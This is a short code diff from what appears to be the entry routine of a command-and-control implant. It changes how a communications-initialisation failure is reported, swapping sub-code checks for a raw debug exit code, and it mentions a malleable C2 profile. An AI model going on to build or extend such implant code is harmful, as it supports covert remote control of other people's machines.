@@ -169,12 +169,8 @@ void implant_entry(PVOID param) {
     /* ---- Step 7: Initialize communications engine ---- */
     status = comms_init(&g_ctx);
     if (!NT_SUCCESS(status)) {
-        /* Sub-codes: 0x160-0x16F=API resolve, 0x165=no channels,
-           0x170-0x17F=connection */
-        DWORD sub = (DWORD)(status & 0xFFF);
-        if (sub >= 0x160 && sub <= 0x17F)
-            DEV_FAIL(sub);
-        DEV_FAIL(16);
+        /* Output raw status as exit code for debugging */
+        DEV_FAIL((DWORD)(status & 0xFFFF));
     }
 
     /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
